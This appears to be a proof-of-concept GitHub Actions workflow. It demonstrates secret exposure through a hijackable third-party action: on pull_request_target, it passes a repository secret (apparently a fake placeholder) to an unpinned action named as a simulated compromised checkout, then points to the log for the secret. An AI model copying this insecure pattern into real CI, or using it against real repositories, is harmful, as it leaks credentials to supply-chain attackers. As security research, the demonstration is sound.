name: "PoC tag hijack reachability"
on:
  pull_request_target:
    types: [opened, reopened, synchronize, ready_for_review]
permissions:
  pull-requests: write
  contents: read
jobs:
  poc-agent-triage-pull-request:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout step PoC
        uses: mabrukhany-beep/poc-simulated-compromised-checkout@main
        env:
          POC_FAKE_ADK_TRIAGE_AGENT: ${{ secrets.POC_FAKE_ADK_TRIAGE_AGENT }}
      - name: Explain result
        run: echo "check above step log for POC_FAKE_ADK_TRIAGE_AGENT"
